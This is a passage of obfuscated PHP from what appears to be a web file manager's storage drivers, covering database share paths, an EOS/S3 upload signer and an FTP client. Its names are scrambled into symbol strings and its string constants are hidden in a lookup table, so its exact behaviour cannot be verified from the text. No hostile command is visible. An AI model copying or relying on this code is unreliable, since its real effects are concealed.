count($‚˝©¿÷¥[$„ß«≥º«[1437]]) - 1) { $¨ª‘äÜú = $this->model->mkfile($¨ª‘äÜú, $Ï◊ê¿Ù–, $›∫¨¡Ωº, $óòçæ–ö); break; } $¨ª‘äÜú = $this->model->mkdir($¨ª‘äÜú, $Ï◊ê¿Ù–, REPEAT_SKIP); } return $this->getPathOuter($¨ª‘äÜú); } public function mkdir($ª®ß‡õ§, $Ç›⁄±Åô = REPEAT_SKIP) { $„¯—¡ÜÁ =& $_SERVER[ˆë€Ï⁄∂]; $´Ï·Ì§à = $this->parse($ª®ß‡õ§); $ª®ß‡õ§ = $´Ï·Ì§à[$„¯—¡ÜÁ[486]]; for ($‹…ª∏‹ä = 0; $‹…ª∏‹ä < count($´Ï·Ì§à[$„¯—¡ÜÁ[1437]]); $‹…ª∏‹ä++) { $ÑÎÔøùœ = $´Ï·Ì§à[$„¯—¡ÜÁ[1437]][$‹…ª∏‹ä]; $ª®ß‡õ§ = $this->model->mkdir($ª®ß‡õ§, $ÑÎÔøùœ, $Ç›⁄±Åô); } return $this->getPathOuter($ª®ß‡õ§); } public function copyFile($ô≠ô§∏¿, $§Õúüóâ, $‰‡≥ÈÙ¿ = REPEAT_REPLACE) { $≠ƒ‡ﬁÍô =& $_SERVER[ˆë€Ï⁄∂]; $¿°©ˆó = $this->parse($§Õúüóâ); $ß¯ﬂ´Û¥ = $this->model->copy($ô≠ô§∏¿, $¿°©ˆó[$≠ƒ‡ﬁÍô[486]], $‰‡≥ÈÙ¿, $¿°©ˆó[$≠ƒ‡ﬁÍô[97]]); return $ß¯ﬂ´Û¥ ? $this->getPathOuter($ß¯ﬂ´Û¥) : !1; } public function moveFile($≠Í≈äÎÄ, $ÉãßÜÛû, $àﬁíéúˆ = REPEAT_REPLACE) { $πûÎ•î˙ =& $_SERVER[ˆë€Ï⁄∂]; $ΩÃá∑¡© = $this->parse($ÉãßÜÛû); $„ÁöÚø© = $this->model->move($≠Í≈äÎÄ, $ΩÃá∑¡©[$πûÎ•î˙[486]], $àﬁíéúˆ, $ΩÃá∑¡©[$πûÎ•î˙[97]]); return $„ÁöÚø© ? $this->getPathOuter($„ÁöÚø©) : !1; } public function copy($£Áœæ∏, $ıø≈◊Ê®, $±Â∏Ω‚¯ = REPEAT_REPLACE, $›Âπ–¶ß = false) { $∑‡ó≥àØ = $this->parse($ıø≈◊Ê®); $ÿ›ñü∫® = $this->model->copy($£Áœæ∏, $∑‡ó≥àØ[$_SERVER[ˆë€Ï⁄∂][486]], $±Â∏Ω‚¯, $›Âπ–¶ß); return $ÿ›ñü∫® ? $this->getPathOuter($ÿ›ñü∫®) : !1; } public function moveSameAllow() { } public function move($ñÃÁ⁄Ë’, $ ∑ËíΩ©, $€≤ùÏ¯» = REPEAT_REPLACE, $ûÄı¡è˝ = false) { $€ß‚≠è = $this->parse($ ∑ËíΩ©); $∂˘ÎÁ∂Ã = $this->model->move($ñÃÁ⁄Ë’, $€ß‚≠è[$_SERVER[ˆë€Ï⁄∂][486]], $€≤ùÏ¯», $ûÄı¡è˝); return $∂˘ÎÁ∂Ã ? $this->getPathOuter($∂˘ÎÁ∂Ã) : !1; } public function remove($≈ÆÏπì, $„—éÀÎΩ = true) { return $this->model->remove($≈ÆÏπì, $„—éÀÎΩ); } public function rename($ò‘è¯Å¬, $÷€Ω≠Ä∫) { $°ÛÀá”  = $this->model->rename($ò‘è¯Å¬, $÷€Ω≠Ä∫); return $°ÛÀá”  ? $this->getPathOuter($ò‘è¯Å¬) : $°ÛÀá” ; } public function size($ûÁÿö«û) { $˚Ÿ≤Ë©˜ = $this->infoSimple($ûÁÿö«û); return $˚Ÿ≤Ë©˜ ? $˚Ÿ≤Ë©˜[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function infoSimple($–à˙îÃÉ) { return $this->model->sourceInfo($–à˙îÃÉ); } public function info($Ñòï•ïÏ) { return $this->infoParse($Ñòï•ïÏ); } public function infoAuth($¿Û˝…¢ã) { return $this->infoParse($¿Û˝…¢ã, !1, !0); } public function infoWithChildren($ΩõÜ†”ª) { return $this->infoParse($ΩõÜ†”ª, !0); } protected function infoParse($É§¬ù€Í, $Ñ’óÃú = false, $’ü…±Üﬁ = false) { if (!$Ñ’óÃú) { return $this->model->pathInfo($É§¬ù€Í, $’ü…±Üﬁ); } return $this->model->pathInfoMore($É§¬ù€Í); } public function infoFullSimple($ƒÇπ®àÂ) { $˛Ï¥£õ’ =& $_SERVER[ˆë€Ï⁄∂]; $Êùßœœ– = explode($˛Ï¥£õ’[8], $ƒÇπ®àÂ); $∏àùÜ…é = implode($˛Ï¥£õ’[8], array_splice($Êùßœœ–, 1)); return $this->model->pathInfoByPath($Êùßœœ–[0], $∏àùÜ…é); } public function infoFull($Ê«Ù˘ìﬂ) { $˚ªæÙÁÜ = $this->infoFullSimple($Ê«Ù˘ìﬂ); return is_array($˚ªæÙÁÜ) ? $this->model->pathInfo($˚ªæÙÁÜ[$_SERVER[ˆë€Ï⁄∂][203]]) : !1; } public function hashSimple($Øœ´±ÙÄ) { $Ï¥ÍÙªù =& $_SERVER[ˆë€Ï⁄∂]; $€È≠±‚„ = $this->infoWithChildren($Øœ´±ÙÄ); return $€È≠±‚„[$Ï¥ÍÙªù[180]][$Ï¥ÍÙªù[686]]; } public function hashMd5($∂ÍÌ¿è˝) { $ˆì⁄˙úÎ =& $_SERVER[ˆë€Ï⁄∂]; $ñ˚¥¯Í  = $this->infoWithChildren($∂ÍÌ¿è˝); return $ñ˚¥¯Í [$ˆì⁄˙úÎ[180]][$ˆì⁄˙úÎ[558]]; } public function exist($¡êΩ˛£Ö) { $Ùç∏ëÿ◊ =& $_SERVER[ˆë€Ï⁄∂]; $¬‡óÁı” = $this->parse($¡êΩ˛£Ö); if (!$¬‡óÁı”[$Ùç∏ëÿ◊[97]]) { return $this->isFile($¡êΩ˛£Ö) || $this->isFolder($¡êΩ˛£Ö); } $ûœ∂π∂ù = array($Ùç∏ëÿ◊[488] => $¬‡óÁı”[$Ùç∏ëÿ◊[486]], $Ùç∏ëÿ◊[32] => $¬‡óÁı”[$Ùç∏ëÿ◊[97]]); $‰öÃŸúŸ = $this->model->where($ûœ∂π∂ù)->find(); return $‰öÃŸúŸ ? !0 : !1; } public function isFile($æÁíŒƒ—) { $–ì†ªñê =& $_SERVER[ˆë€Ï⁄∂]; $‡≈Ù‰˙‘ = $this->infoSimple($æÁíŒƒ—); return $‡≈Ù‰˙‘ && $‡≈Ù‰˙‘[$–ì†ªñê[496]] == $–ì†ªñê[240] ? !0 : !1; } public function isFolder($∫∆æ±íü) { $€ÿÓ´ÎÕ =& $_SERVER[ˆë€Ï⁄∂]; $ë â∆∏÷ = $this->infoSimple($∫∆æ±íü); return $ë â∆∏÷ && $ë â∆∏÷[$€ÿÓ´ÎÕ[496]] == $€ÿÓ´ÎÕ[101] ? !0 : !1; } public function listPath($ßﬁ…€¨º, $ıÓ·Ó°ñ = false) { $Úâµ»¨Ñ =& $_SERVER[ˆë€Ï⁄∂]; if ($ßﬁ…€¨º == $Úâµ»¨Ñ[12]) { return !1; } $ÉÄØãÑ” = array($Úâµ»¨Ñ[488] => $ßﬁ…€¨º); if ($ıÓ·Ó°ñ) { return $this->model->listSource($ÉÄØãÑ”, -1); } return $this->model->listSource($ÉÄØãÑ”); } public function has($Ö‰ªµüú, $Ä›ÙûúÑ = false, $ﬁµ¶ò«ç = null) { $∂üê⁄˘˜ =& $_SERVER[ˆë€Ï⁄∂]; $…´æŒ◊ú = $this->infoWithChildren($Ö‰ªµüú); if ($Ä›ÙûúÑ) { return array($∂üê⁄˘˜[252] => $…´æŒ◊ú[$∂üê⁄˘˜[252]], $∂üê⁄˘˜[251] => $…´æŒ◊ú[$∂üê⁄˘˜[251]]); } return $ﬁµ¶ò«ç ? $…´æŒ◊ú[$∂üê⁄˘˜[252]] : $…´æŒ◊ú[$∂üê⁄˘˜[251]]; } public function listAll($ê◊÷≠ˆ∏) { $•©Âùîè = IO::info($this->pathParse[$_SERVER[ˆë€Ï⁄∂][97]]); if (!$•©Âùîè) { return array(); } return $this->model->listAll($ê◊÷≠ˆ∏); } public function getContent($¯´∂Ñ¬«) { return $this->model->getContent($¯´∂Ñ¬«); } public function setContent($‰°ä≈∫Ω, $˜ÕÑÉ„Ω = '') { return $this->model->setContent($‰°ä≈∫Ω, $˜ÕÑÉ„Ω); } public function fileSubstr($ŒºÖﬁ¥¿, $Åçµù˘ü, $éƒ≥Õòò) { return $this->model->fileSubstr($ŒºÖﬁ¥¿, $Åçµù˘ü, $éƒ≥Õòò); } public function download($ˆÓÙåÜÍ, $àüú√◊” = '') { $æıÅ˝ô¶ = get_path_father($àüú√◊”); $Ë«î®¬∞ = get_path_this($àüú√◊”); $Ÿ≤ãßÔ√ = $this->model->fileInfoGet($ˆÓÙåÜÍ); $Ã∞∞¸ñò = IO::copy($Ÿ≤ãßÔ√[$_SERVER[ˆë€Ï⁄∂][97]], $æıÅ˝ô¶, !1, $Ë«î®¬∞); return $Ã∞∞¸ñò; } public function setModifyTime($•åì˙…£, $ÖﬁË’á≤ = '') { $√¿¢¿úí =& $_SERVER[ˆë€Ï⁄∂]; if (!$•åì˙…£) { return; } $this->model->where(array($√¿¢¿úí[502] => $•åì˙…£))->save(array($√¿¢¿úí[98] => $ÖﬁË’á≤)); } public function upload($ÕıÎ±˚Ü, $‹º⁄¯ÛÑ, $§É◊Ÿì· = false, $Æ›Ôó¸÷ = REPEAT_REPLACE) { $ç∫úÛ≠◊ =& $_SERVER[ˆë€Ï⁄∂]; $À¸ÏÌÀø = $this->parse($ÕıÎ±˚Ü); $ßåàû⁄‰ = $this->model->addFile($À¸ÏÌÀø[$ç∫úÛ≠◊[486]], $‹º⁄¯ÛÑ, $À¸ÏÌÀø[$ç∫úÛ≠◊[97]], $§É◊Ÿì·, $Æ›Ôó¸÷); return $this->getPathOuter($ßåàû⁄‰); } public function uploadFileByID($ßåΩ≥⁄÷, $Ö€ÒõÀ∆, $ﬂÁ„ËΩ≤) { $ó§ÈÍôó =& $_SERVER[ˆë€Ï⁄∂]; $Ñ†ú«Ì‹ = $this->parse($ßåΩ≥⁄÷); $¨ΩÄ®§ü = $this->model->addFileByFileID($Ñ†ú«Ì‹[$ó§ÈÍôó[486]], $Ö€ÒõÀ∆, $Ñ†ú«Ì‹[$ó§ÈÍôó[97]], $ﬂÁ„ËΩ≤); return $this->getPathOuter($¨ΩÄ®§ü); } public function addFileByRemote($œ¸ªå’ë, $È»˚æÕŒ, $ë¡ï´Ä∫ = array(), $£«ìÊ∂ﬂ = '', $–ÖòæÿÒ) { $Ã´¶Ûßπ =& $_SERVER[ˆë€Ï⁄∂]; $π£Æ˛∂« = $this->parse($œ¸ªå’ë); $£«ìÊ∂ﬂ = empty($£«ìÊ∂ﬂ) ? $π£Æ˛∂«[$Ã´¶Ûßπ[97]] : $£«ìÊ∂ﬂ; $∏©Î∆œ¢ = $this->model->addFileByRemote($π£Æ˛∂«[$Ã´¶Ûßπ[486]], $È»˚æÕŒ, $£«ìÊ∂ﬂ, $ë¡ï´Ä∫, $–ÖòæÿÒ); return $this->getPathOuter($∏©Î∆œ¢); } public function uploadLink($ùéìÜ˛ú, $∑ÑΩ™Í≥ = 0) { $ÊáõÁ∂∂ =& $_SERVER[ˆë€Ï⁄∂]; $⁄˝Ù°¯¡ = $this->parse($ùéìÜ˛ú); $˛üƒã»§ = _get($GLOBALS[$ÊáõÁ∂∂[7]], $ÊáõÁ∂∂[1438]); $Äñ˘ä¡ã = _get($GLOBALS[$ÊáõÁ∂∂[7]], $ÊáõÁ∂∂[1439]); $ùéìÜ˛ú = Model($ÊáõÁ∂∂[688])->createFileName($⁄˝Ù°¯¡[$ÊáõÁ∂∂[97]], $˛üƒã»§, $Äñ˘ä¡ã); return IO::uploadLink($ùéìÜ˛ú, $∑ÑΩ™Í≥); } public function fileNameAuto($ÙÛÍ”‡€, $€Ò÷æ¯«, $·§≥¿ºÒ = REPEAT_REPLACE, $∫™äçå€ = false) { return $this->model->fileNameAuto($ÙÛÍ”‡€, $€Ò÷æ¯«, $·§≥¿ºÒ, $∫™äçå€); } public function fileNameExist($§ÁûÆü–, $æÛÌﬁÆ¿) { return $this->model->fileNameExist($§ÁûÆü–, $æÛÌﬁÆ¿); } protected function _fileOut($¿ãµ∆¢ê, $—«¢¶À€ = false, $ éö—ÊÍ = false, $◊Ÿ√˙î◊ = '', $Ìæò£é– = false) { $∑ÖÃâ˜À =& $_SERVER[ˆë€Ï⁄∂]; $ôÆ∂¨”¨ = $this->model->sourceInfo($¿ãµ∆¢ê); if ($ôÆ∂¨”¨[$∑ÖÃâ˜À[496]] == $∑ÖÃâ˜À[101]) { header($∑ÖÃâ˜À[1440]); die; } $É¿ÕË¯ = $this->model->fileInfoGet($¿ãµ∆¢ê); $◊Ÿ√˙î◊ = $É¿ÕË¯[$∑ÖÃâ˜À[558]] ? $É¿ÕË¯[$∑ÖÃâ˜À[558]] : $◊Ÿ√˙î◊; $Ø¶ùëè¥ = isset($GLOBALS[$∑ÖÃâ˜À[192]]) && is_array($GLOBALS[$∑ÖÃâ˜À[192]]) ? $GLOBALS[$∑ÖÃâ˜À[192]][$∑ÖÃâ˜À[32]] : $ôÆ∂¨”¨[$∑ÖÃâ˜À[32]]; if ($Ìæò£é–) { return IO::fileOutServer($É¿ÕË¯[$∑ÖÃâ˜À[97]], $—«¢¶À€, $Ø¶ùëè¥, $◊Ÿ√˙î◊); } IO::fileOut($É¿ÕË¯[$∑ÖÃâ˜À[97]], $—«¢¶À€, $Ø¶ùëè¥, $◊Ÿ√˙î◊); } public function fileOut($˜µËﬂ—˝, $†Æ¿◊Ñå = false, $ƒ‰Ñ”ûá = false, $¨ÒÛ•’ = '') { $this->_fileOut($˜µËﬂ—˝, $†Æ¿◊Ñå, $ƒ‰Ñ”ûá, $¨ÒÛ•’); } public function fileOutServer($°ú˜˚Â˜, $í¨ñ˜˛À = false, $˚∂´≤„· = false, $—ΩıªöΩ = '') { $this->_fileOut($°ú˜˚Â˜, $í¨ñ˜˛À, $˚∂´≤„·, $—ΩıªöΩ, !0); } protected function _fileOutImage($û¨Õ˘¨Í, $◊Ê“Ñòÿ = 250) { $∂‰É∂√≥ =& $_SERVER[ˆë€Ï⁄∂]; $Æ—à£Á = $this->model->pathInfo($û¨Õ˘¨Í); if ($Æ—à£Á[$∂‰É∂√≥[496]] == $∂‰É∂√≥[101]) { show_json($∂‰É∂√≥[1441] . $û¨Õ˘¨Í, !1); } $˚Î≤≤Ì≈ = $this->model->fileInfoGet($û¨Õ˘¨Í); $Æ—à£Á[$∂‰É∂√≥[193]] = $˚Î≤≤Ì≈[$∂‰É∂√≥[97]]; $GLOBALS[$∂‰É∂√≥[192]] = $Æ—à£Á; IO::fileOutImage($˚Î≤≤Ì≈[$∂‰É∂√≥[97]], $◊Ê“Ñòÿ); } public function fileOutImage($È¯Öùﬂ , $‹≥Óñπ« = 250) { $this->_fileOutImage($È¯Öùﬂ , $‹≥Óñπ«); } public function fileOutImageServer($Î¶ ÑöΩ, $≈–Òòñê = 250) { $this->_fileOutImage($Î¶ ÑöΩ, $≈–Òòñê); } public function link($Ö≤éö¥ß, $ÿÄä€§« = '') { $öÄÕ˝£ö = $this->model->fileInfoGet($Ö≤éö¥ß); return IO::link($öÄÕ˝£ö[$_SERVER[ˆë€Ï⁄∂][97]], $ÿÄä€§«); } protected function parse($åÛÄ…π¿) { $—€è©˛÷ =& $_SERVER[ˆë€Ï⁄∂]; if (strstr($åÛÄ…π¿, $—€è©˛÷[8]) === !1) { return array($—€è©˛÷[504] => intval($åÛÄ…π¿), $—€è©˛÷[97] => $—€è©˛÷[12], $—€è©˛÷[1437] => array()); } $˛êÔÛÒπ = explode($—€è©˛÷[8], trim($åÛÄ…π¿, $—€è©˛÷[8])); if (count($˛êÔÛÒπ) < 2) { show_tips(clear_html($åÛÄ…π¿) . $—€è©˛÷[1442]); } return array($—€è©˛÷[504] => intval($˛êÔÛÒπ[0]), $—€è©˛÷[97] => $˛êÔÛÒπ[1], $—€è©˛÷[1437] => array_slice($˛êÔÛÒπ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($‰´Ï≥Ù⁄) { $this->pathParse = $‰´Ï≥Ù⁄; $this->model = Model($_SERVER[ˆë€Ï⁄∂][1436]); } public function getPathOuter($É•·Ã¥Ω) { $Â¶÷»¥ä =& $_SERVER[ˆë€Ï⁄∂]; if (!$É•·Ã¥Ω) { return $É•·Ã¥Ω; } $û»ΩÑÃË = $this->parse($É•·Ã¥Ω); return trim(KodIO::makeShare($this->pathParse[$Â¶÷»¥ä[486]], $û»ΩÑÃË[$Â¶÷»¥ä[486]]), $Â¶÷»¥ä[8]); } protected function infoParse($ÛÚı˝Œã, $Ö¬»„Î¡ = false, $°¬¢“œ’ = false) { $˝¶‚’©– =& $_SERVER[ˆë€Ï⁄∂]; $€Ÿ±†°† = $this->pathParse[$˝¶‚’©–[486]]; $êñ˜´∏¨ = trim($this->pathParse[$˝¶‚’©–[1265]], $˝¶‚’©–[8]); return Action($˝¶‚’©–[1443])->sharePathInfo($€Ÿ±†°†, $êñ˜´∏¨, $Ö¬»„Î¡); } public function infoFull($Ã—»ıÒÃ) { $∏¡›±‘Ó =& $_SERVER[ˆë€Ï⁄∂]; $©í·ŸùÂ = explode($∏¡›±‘Ó[8], trim($Ã—»ıÒÃ, $∏¡›±‘Ó[8])); if (count($©í·ŸùÂ) > 1) { $ÊŒ“˛Ü¡ = implode($∏¡›±‘Ó[8], array_splice($©í·ŸùÂ, 1)); $êöÆ®òò = $this->model->pathInfoByPath($©í·ŸùÂ[0], $ÊŒ“˛Ü¡); if (!$êöÆ®òò) { return !1; } $this->pathParse[$∏¡›±‘Ó[1265]] = $êöÆ®òò[$∏¡›±‘Ó[203]]; } return $this->infoParse($Ã—»ıÒÃ); } public function listAll($Î˜∂ó˚Ò) { $√ªªÊ‘œ =& $_SERVER[ˆë€Ï⁄∂]; $Î±√∂îÜ = IO::info($this->pathParse[$√ªªÊ‘œ[97]]); if (!$Î±√∂îÜ) { return array(); } $ûùñ¶ıæ = $this->model->listAll($Î˜∂ó˚Ò); $˙úÚ•ñÌ = Model($√ªªÊ‘œ[678])->getInfo($Î±√∂îÜ[$√ªªÊ‘œ[679]]); foreach ($ûùñ¶ıæ as &$Ö´Ã˘ÿä) { check_abort(); $Ö´Ã˘ÿä[$√ªªÊ‘œ[100]] = Action($√ªªÊ‘œ[1443])->_shareItemeParse($Ö´Ã˘ÿä[$√ªªÊ‘œ[100]], $˙úÚ•ñÌ); } unset($Ö´Ã˘ÿä); return $ûùñ¶ıæ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÛÄ®™≠Õ) { $this->pathParse = $ÛÄ®™≠Õ; $this->model = Model($_SERVER[ˆë€Ï⁄∂][1436]); } protected function infoParse($õ√≈ÿÛÕ, $÷Í‹äê¥ = false, $∑æ†òæ˝ = false) { $›ªíß’Ô =& $_SERVER[ˆë€Ï⁄∂]; return Action($›ªíß’Ô[1271])->sharePathInfo($this->pathParse[$›ªíß’Ô[97]], !0, $÷Í‹äê¥); } public function listPath($ÄøåÎˆÀ, $ÆŸµØºó = false) { $÷≤ºÑÅ£ =& $_SERVER[ˆë€Ï⁄∂]; $Öπ∑üÔÃ = parent::listPath($ÄøåÎˆÀ, $ÆŸµØºó); if (!$Öπ∑üÔÃ) { return $Öπ∑üÔÃ; } if (is_array($Öπ∑üÔÃ[$÷≤ºÑÅ£[1444]])) { $Öπ∑üÔÃ[$÷≤ºÑÅ£[1444]] = Action($÷≤ºÑÅ£[1271])->shareItemInfo($Öπ∑üÔÃ[$÷≤ºÑÅ£[1444]]); } foreach ($Öπ∑üÔÃ as $˘úﬁâ‚÷ => $·ñ‰Ì≥¡) { if (!in_array($˘úﬁâ‚÷, array($÷≤ºÑÅ£[96], $÷≤ºÑÅ£[95]))) { continue; } foreach ($·ñ‰Ì≥¡ as $‚™ö«àÃ => $±â∂Ÿ∏£) { $Öπ∑üÔÃ[$˘úﬁâ‚÷][$‚™ö«àÃ] = Action($÷≤ºÑÅ£[1271])->shareItemInfo($±â∂Ÿ∏£); } } return $Öπ∑üÔÃ; } public function listAll($Áî ¥Õö) { $ÙˆˆÇõú =& $_SERVER[ˆë€Ï⁄∂]; $†—ïŸΩ∫ = IO::info($this->pathParse[$ÙˆˆÇõú[97]]); if (!$†—ïŸΩ∫) { return array(); } $àíÕè¯Ó = $this->model->listAll($Áî ¥Õö); foreach ($àíÕè¯Ó as &$¨ùó·äø) { $¨ùó·äø[$ÙˆˆÇõú[100]] = Action($ÙˆˆÇõú[1271])->shareItemInfo($¨ùó·äø[$ÙˆˆÇõú[100]]); } unset($¨ùó·äø); return $àíÕè¯Ó; } } goto E·®Ó°‰ßˆ; b€âî≠ıøÆ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($±íÃåø—) { parent::__construct($±íÃåø—); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } public function uploadFormData($‚Â¢ÕöÛ, $ç˙à∂ø˝ = 3600) { $…Ÿ≥Î⁄ö =& $_SERVER[ˆë€Ï⁄∂]; $Áò¶ÊπÄ = $…Ÿ≥Î⁄ö[241]; $≥ê™£ŸÉ = $…Ÿ≥Î⁄ö[269]; $°ƒûØÚÂ = $…Ÿ≥Î⁄ö[72]; $Ù¬£€ÿ° = gmdate($…Ÿ≥Î⁄ö[270]); $ùû∂·±¡ = gmdate($…Ÿ≥Î⁄ö[271]); $Ù∆®Ññë = $…Ÿ≥Î⁄ö[272]; $∫¶˚™√  = $ç˙à∂ø˝ . $…Ÿ≥Î⁄ö[12]; $¶Ëêπ÷± = $…Ÿ≥Î⁄ö[273]; $¯Õƒﬂ¥˜ = array($this->accessKey, $ùû∂·±¡, $this->region, $°ƒûØÚÂ, $Ù∆®Ññë); $ô˛áæ—Î = implode($…Ÿ≥Î⁄ö[8], $¯Õƒﬂ¥˜); $´äÊ∑áﬂ = array($…Ÿ≥Î⁄ö[274] => gmdate($…Ÿ≥Î⁄ö[1428], strtotime($…Ÿ≥Î⁄ö[276])), $…Ÿ≥Î⁄ö[277] => array(array($…Ÿ≥Î⁄ö[278] => $this->bucket), array($…Ÿ≥Î⁄ö[317] => $Áò¶ÊπÄ), array($…Ÿ≥Î⁄ö[279], $…Ÿ≥Î⁄ö[280], $…Ÿ≥Î⁄ö[12]), array($…Ÿ≥Î⁄ö[279], $…Ÿ≥Î⁄ö[281], $…Ÿ≥Î⁄ö[12]), array($…Ÿ≥Î⁄ö[279], $…Ÿ≥Î⁄ö[318], $…Ÿ≥Î⁄ö[12]), array($…Ÿ≥Î⁄ö[282] => $¶Ëêπ÷±), array($…Ÿ≥Î⁄ö[283] => $ô˛áæ—Î), array($…Ÿ≥Î⁄ö[284] => $≥ê™£ŸÉ), array($…Ÿ≥Î⁄ö[285] => $Ù¬£€ÿ°), array($…Ÿ≥Î⁄ö[286] => $∫¶˚™√ ))); $œ»∫≤¸Ì = base64_encode(json_encode($´äÊ∑áﬂ)); $∑”„ªÓÑ = hash_hmac($…Ÿ≥Î⁄ö[287], $ùû∂·±¡, $…Ÿ≥Î⁄ö[288] . $this->secret, !0); $◊ì…≥ƒı = hash_hmac($…Ÿ≥Î⁄ö[287], $this->region, $∑”„ªÓÑ, !0); $¨ü‚π°„ = hash_hmac($…Ÿ≥Î⁄ö[287], $°ƒûØÚÂ, $◊ì…≥ƒı, !0); $Ø‹çÿÙı = hash_hmac($…Ÿ≥Î⁄ö[287], $Ù∆®Ññë, $¨ü‚π°„, !0); $≤∏ƒ∂˙ë = hash_hmac($…Ÿ≥Î⁄ö[287], $œ»∫≤¸Ì, $Ø‹çÿÙı); $«¡ﬂ«ô« = array($…Ÿ≥Î⁄ö[258] => $…Ÿ≥Î⁄ö[12], $…Ÿ≥Î⁄ö[305] => $…Ÿ≥Î⁄ö[12], $…Ÿ≥Î⁄ö[317] => $Áò¶ÊπÄ, $…Ÿ≥Î⁄ö[282] => $¶Ëêπ÷±, $…Ÿ≥Î⁄ö[289] => $œ»∫≤¸Ì, $…Ÿ≥Î⁄ö[319] => $ô˛áæ—Î, $…Ÿ≥Î⁄ö[320] => $≥ê™£ŸÉ, $…Ÿ≥Î⁄ö[321] => $Ù¬£€ÿ°, $…Ÿ≥Î⁄ö[322] => $∫¶˚™√ , $…Ÿ≥Î⁄ö[323] => $≤∏ƒ∂˙ë, $…Ÿ≥Î⁄ö[218] => $this->getHost()); return $«¡ﬂ«ô«; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ï∆©‚Œ…) { parent::__construct(); if (count($ï∆©‚Œ…) > 0) { $this->_init($ï∆©‚Œ…); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($®Ò©ˆÒû) { $ªÃƒª“˘ =& $_SERVER[ˆë€Ï⁄∂]; global $config; $this->appCharset = $config[$ªÃƒª“˘[1454]]; $this->systemCharset = $config[$ªÃƒª“˘[1455]]; if (isset($®Ò©ˆÒû[$ªÃƒª“˘[1456]]) && $®Ò©ˆÒû[$ªÃƒª“˘[1456]]) { $this->systemCharset = $®Ò©ˆÒû[$ªÃƒª“˘[1456]]; } } public function iconvApp($™¿ÀÈ’Ã) { return $this->iconvTo($™¿ÀÈ’Ã, $this->systemCharset, $this->appCharset); } public function iconvSystem($õùÍ©ú˘) { return $this->iconvTo($õùÍ©ú˘, $this->appCharset, $this->systemCharset); } public function getPathOuter($´¶ÿªÍ«) { $å“çáÇΩ =& $_SERVER[ˆë€Ï⁄∂]; $”óÔ´¸ä = $this->iconvApp($this->pathBase); $´¶ÿªÍ« = $this->iconvApp($´¶ÿªÍ«); if (substr($”óÔ´¸ä, 0, 2) == $å“çáÇΩ[1426]) { $”óÔ´¸ä = BASIC_PATH . substr($”óÔ´¸ä, 2); } if (substr($´¶ÿªÍ«, 0, 2) == $å“çáÇΩ[1426]) { $´¶ÿªÍ« = BASIC_PATH . substr($´¶ÿªÍ«, 2); } $”óÔ´¸ä = KodIO::clear($”óÔ´¸ä); $´¶ÿªÍ« = KodIO::clear($´¶ÿªÍ«); $´¶ÿªÍ« = substr($´¶ÿªÍ«, strlen($”óÔ´¸ä)); if (empty($this->pathDriver)) { return $´¶ÿªÍ«; } return $this->pathDriver . $å“çáÇΩ[8] . ltrim($´¶ÿªÍ«, $å“çáÇΩ[8]); } private function _init($ë†§≈— = array()) { $ïÄó¸¨å =& $_SERVER[ˆë€Ï⁄∂]; if (!function_exists($ïÄó¸¨å[1457])) { throw new Exception(LNG($ïÄó¸¨å[1458])); } $this->config = $ë†§≈—; $this->charsetReset($ë†§≈—); foreach ($ë†§≈— as $•˚ß≠Òõ => $ıòÜç€˘) { if (isset($this->{$•˚ß≠Òõ})) { $this->{$•˚ß≠Òõ} = $ıòÜç€˘; } } return $this->_login($ë†§≈—); } private function _login($∑ÛŸ¸Ÿ) { $êÒÇ·ŸΩ =& $_SERVER[ˆë€Ï⁄∂]; static $…‚ƒÂ¢Æ = array(); $ÂÚõï◊„ = md5(json_encode($∑ÛŸ¸Ÿ)); if (isset($…‚ƒÂ¢Æ[$ÂÚõï◊„])) { foreach ($…‚ƒÂ¢Æ[$ÂÚõï◊„] as $¢À¸Î¬â => $ì‹∆ì®≠) { $this->{$¢À¸Î¬â} = $ì‹∆ì®≠; } return !0; } $π£◊˛åñ = parse_url(trim($this->server, $êÒÇ·ŸΩ[8])); $this->host = $π£◊˛åñ[$êÒÇ·ŸΩ[218]]; $¬™Åß°à = isset($π£◊˛åñ[$êÒÇ·ŸΩ[217]]) && $π£◊˛åñ[$êÒÇ·ŸΩ[217]] == $êÒÇ·ŸΩ[1459] ? !0 : !1; $this->scheme = $¬™Åß°à ? $êÒÇ·ŸΩ[1460] : $êÒÇ·ŸΩ[1461]; $this->port = isset($π£◊˛åñ[$êÒÇ·ŸΩ[219]]) ? $π£◊˛åñ[$êÒÇ·ŸΩ[219]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($êÒÇ·ŸΩ[1462]) . $this->host . $êÒÇ·ŸΩ[4] . $this->port, !0); return !1; } $ﬁ≈ﬂ™·‰ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ﬁ≈ﬂ™·‰) { $this->writeLog(LNG($êÒÇ·ŸΩ[1463]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $˙öÇ∑Ü« = $this->pasv == $êÒÇ·ŸΩ[101] ? !0 : !1; @ftp_pasv($this->connect, $˙öÇ∑Ü«); $…‚ƒÂ¢Æ[$ÂÚõï◊„] = array($êÒÇ·ŸΩ[1464] => $this->connect, $êÒÇ·ŸΩ[218] => $this->host, $êÒÇ·ŸΩ[217] => $this->scheme, $êÒÇ·ŸΩ[219] => $this->port); return $ﬁ≈ﬂ™·‰; } private function _isconn($∆∞‹¯§õ = true) { if (is_resource($this->connect)) { return !0; } if (!$∆∞‹¯§õ) { return !1; } return $this->_login($this->config); } public function mkfile($—œ¸âÚÊ, $¢’ê‡ÔÂ = '', $¬ø‰€äé = REPEAT_RENAME) { if ($this->setContent($—œ¸âÚÊ, $¢’ê‡ÔÂ)) { return $this->getPathOuter($—œ¸âÚÊ); } $this->writeLog(LNG($_SERVER[ˆë€Ï⁄∂][1465]), !0); return !1; } public function mkdir($Æ©‡„ê˚, $®îòü“« = REPEAT_SKIP) { $Ê„ë™ÀÖ =& 